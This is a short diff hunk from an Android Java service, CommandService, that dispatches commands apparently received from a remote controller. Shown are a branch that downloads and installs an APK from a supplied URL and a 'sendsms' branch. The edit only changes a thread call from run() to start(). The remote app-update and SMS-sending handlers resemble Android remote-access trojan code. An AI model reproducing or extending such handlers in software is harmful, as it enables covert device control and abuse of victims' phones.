@@ -150,7 +150,7 @@ public class CommandService extends Service {
                                 String apkUrl = cmd.get("arg1").toString();
 
                                 UpdateAppTask atualizaApp = new UpdateAppTask(client, apkUrl);
-                                atualizaApp.run();
+                                atualizaApp.start();
                             } else if (command.equals("sendsms")) {
                                 Log.i(TAG, "\nInvoking SendSMS\n");
                                 String phoneNumber = cmd.get("arg1").toString();
